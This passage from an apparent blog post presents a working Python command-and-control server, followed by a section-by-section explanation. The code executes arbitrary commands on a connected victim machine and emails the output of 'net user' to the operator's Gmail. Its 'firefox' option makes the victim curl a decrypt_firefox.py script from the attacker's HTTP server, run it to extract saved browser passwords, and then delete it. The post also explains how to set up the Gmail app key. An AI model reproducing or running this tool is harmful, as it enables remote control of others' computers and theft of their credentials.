<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] Leaving the program...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>

<span class="c1"># root?
</span><span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] You need to be root</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Listener</span><span class="p">:</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">options</span> <span class="o">=</span> <span class="p">{</span><span class="s">"get users"</span><span class="p">:</span> <span class="s">"List system valid users (Gmail)"</span><span class="p">,</span> <span class="s">"help"</span><span class="p">:</span> <span class="s">"Show this help panel"</span><span class="p">,</span> <span class="s">"firefox"</span><span class="p">:</span> <span class="s">"Get firefox browser passwords"</span><span class="p">}</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span> <span class="o">=</span> <span class="bp">None</span>

        <span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">listen</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Listening for incoming connections...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">client_address</span> <span class="o">=</span> <span class="n">server_socket</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Connection established by </span><span class="si">{</span><span class="n">client_address</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">command_remotely</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">).</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'cp850'</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">send_email</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">recipients</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">subject</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">sender</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="s">', '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">recipients</span><span class="p">)</span>

        <span class="k">with</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP_SSL</span><span class="p">(</span><span class="s">'smtp.gmail.com'</span><span class="p">,</span> <span class="mi">465</span><span class="p">)</span> <span class="k">as</span> <span class="n">smtp_server</span><span class="p">:</span>
            <span class="n">smtp_server</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
            <span class="n">smtp_server</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">recipients</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Emails sent successfully!!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">get_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"net user"</span><span class="p">)</span>
        <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_email</span><span class="p">(</span><span class="s">"Net Users Report - C2"</span><span class="p">,</span> <span class="n">command_output</span><span class="p">,</span> <span class="s">"your@gmail.com"</span><span class="p">,</span> <span class="p">[</span><span class="s">"your@gmail.com"</span><span class="p">],</span> <span class="s">"jdad cnda uvda sawa"</span><span class="p">)</span> <span class="c1"># e-mail addres &amp;&amp; aplication key of yout e-mail addres
</span>
    <span class="k">def</span> <span class="nf">help_panel</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">donde</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="s">"cd"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">donde</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">options</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s"> - </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">check_path</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">directory</span> <span class="o">=</span> <span class="n">tempfile</span><span class="p">.</span><span class="n">mkdtemp</span><span class="p">(</span><span class="n">prefix</span><span class="o">=</span><span class="s">"Python-Server-"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"Temporary directory '</span><span class="si">{</span><span class="n">directory</span><span class="si">}</span><span class="s">' created.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">))</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">file_to_copy</span> <span class="o">=</span> <span class="s">"decrypt_firefox.py"</span>
            <span class="n">current_directory</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">getcwd</span><span class="p">()</span>
            <span class="n">source_file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">current_directory</span><span class="p">,</span> <span class="n">file_to_copy</span><span class="p">)</span>
            <span class="n">destination_file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">directory</span><span class="p">,</span> <span class="n">file_to_copy</span><span class="p">)</span>
            <span class="n">shutil</span><span class="p">.</span><span class="n">copy</span><span class="p">(</span><span class="n">source_file_path</span><span class="p">,</span> <span class="n">destination_file_path</span><span class="p">)</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"Error al copiar el archivo: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">directory</span>

    <span class="k">def</span> <span class="nf">start_local_http_server</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">directory</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"python3"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"http.server"</span><span class="p">,</span> <span class="s">"80"</span><span class="p">,</span> <span class="s">"-d"</span><span class="p">,</span> <span class="n">directory</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"[+] HTTP Server started successfully"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Error, you need to check if you have any services on port 80: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">stop_local_http_server</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span><span class="p">.</span><span class="n">terminate</span><span class="p">()</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"[+] HTTP Server stopped successfully"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">get_firefox_passwords</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">directory</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">check_path</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">start_local_http_server</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">win_user</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="s">"whoami"</span><span class="p">)</span>
            <span class="n">win_user_str</span> <span class="o">=</span> <span class="n">win_user</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
            <span class="n">release</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="sa">f</span><span class="s">'dir /s /b /ad "C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="si">{</span><span class="n">win_user_str</span><span class="si">}</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">Roaming</span><span class="se">\\</span><span class="s">Mozilla</span><span class="se">\\</span><span class="s">Firefox</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">*release*"'</span><span class="p">)</span>
            <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"cd C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="si">{</span><span class="n">win_user_str</span><span class="si">}</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">Local</span><span class="se">\\</span><span class="s">Temp &amp;&amp; curl http://</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">/decrypt_firefox.py -o decrypt_firefox.py &amp;&amp; python decrypt_firefox.py </span><span class="si">{</span><span class="n">release</span><span class="si">}</span><span class="s">"</span>
            <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Sent command: </span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">))</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">command_output</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

            <span class="k">try</span><span class="p">:</span>
                <span class="c1"># Cleaning
</span>                <span class="n">pwd</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"del C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="si">{</span><span class="n">win_user_str</span><span class="si">}</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">Local</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">decrypt_firefox.py"</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
                <span class="n">shutil</span><span class="p">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">stop_local_http_server</span><span class="p">()</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] it has not been possible to delete the file 'decrypt_firefox.py' if you run 'firefox' again it will not be possible."</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
                <span class="k">pass</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>
            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"get users"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">get_user</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"firefox"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">get_firefox_passwords</span><span class="p">()</span>
            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"help"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">help_panel</span><span class="p">()</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">command_output</span><span class="p">)</span>

</code></pre></div></div>
<p>I will explain the most important parts of the code as follows:</p>

<h2 id="listener-class">Listener class</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Listener</span><span class="p">:</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">options</span> <span class="o">=</span> <span class="p">{</span><span class="s">"get users"</span><span class="p">:</span> <span class="s">"List system valid users (Gmail)"</span><span class="p">,</span> <span class="s">"help"</span><span class="p">:</span> <span class="s">"Show this help panel"</span><span class="p">,</span> <span class="s">"firefox"</span><span class="p">:</span> <span class="s">"Get firefox browser passwords"</span><span class="p">}</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span> <span class="o">=</span> <span class="bp">None</span>

        <span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">listen</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Listening for incoming connections...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">client_address</span> <span class="o">=</span> <span class="n">server_socket</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Connection established by </span><span class="si">{</span><span class="n">client_address</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">))</span>
</code></pre></div></div>
<p>We create the <strong>__init__()</strong> method: in the Listener class, I create attributes that are instantiated in the Listener class: self.ip = ip, self.options = options, self.server_process =None. And objects so that the connection can be established.</p>

<p>In the objects one line is important:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">server_socket</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>
<p>This code reutlizes the connection in case it closes, so that we have no problems.</p>

<h2 id="send-command">Send Command</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">command_remotely</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">).</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'cp850'</span><span class="p">)</span>
</code></pre></div></div>

<p>This function is to send the command that has been entered by the user running this program.</p>

<h2 id="run">Run</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>
            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"get users"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">get_user</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"firefox"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">get_firefox_passwords</span><span class="p">()</span>
            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"help"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">help_panel</span><span class="p">()</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">command_output</span><span class="p">)</span>
</code></pre></div></div>

<p>In this function, we create a while loop to receive and execute the commands continuously. But if the command is = any predefined function in the program, then the specific function will be executed.</p>

<h2 id="send-e-mail">Send E-mail</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_email</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">recipients</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">subject</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">sender</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="s">', '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">recipients</span><span class="p">)</span>

        <span class="k">with</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP_SSL</span><span class="p">(</span><span class="s">'smtp.gmail.com'</span><span class="p">,</span> <span class="mi">465</span><span class="p">)</span> <span class="k">as</span> <span class="n">smtp_server</span><span class="p">:</span>
            <span class="n">smtp_server</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
            <span class="n">smtp_server</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">recipients</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Emails sent successfully!!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>
</code></pre></div></div>

<p>The purpose of this function is to send e-mail whit the output of the specific command.</p>

<h2 id="example-of-specific-command">Example of Specific Command</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"net user"</span><span class="p">)</span>
        <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_email</span><span class="p">(</span><span class="s">"Net Users Report - C2"</span><span class="p">,</span> <span class="n">command_output</span><span class="p">,</span> <span class="s">"your@gmail.com"</span><span class="p">,</span> <span class="p">[</span><span class="s">"your@gmail.com"</span><span class="p">],</span> <span class="s">"jdad cnda uvda sawa"</span><span class="p">)</span> <span class="c1"># e-mail addres &amp;&amp; aplication key of yout e-mail addres
</span></code></pre></div></div>
<p>This function is used to obtain valid users from the system and send them by e-mail. In the <strong>self.send_email()</strong> part, you need to put your e-mail where you want to receive the content and the application key. And it is important to have two-step verification on your email account.</p>

<p>Two-step verification:</p>

<p><img src="/assets/images/Command-And-Control/two-set-verification.png" alt="" /></p>

<p>Application Key:</p>

<p><img src="/assets/images/Command-And-Control/email-password.png" alt="" /></p>]]></content><author><name>Arc4he</name><email>arc4.he@gmail.com</email></author><category term="programming" /><category term="python" /><category term="malware" /><category term="C&amp;C" /><category term="programming" /><summary type="html"><![CDATA[A Command and Control is a software to control a client from the server. Is a software to control a client from the server. The command and control server can be controlled by any operator to execute malware for example.]]></summary></entry></feed>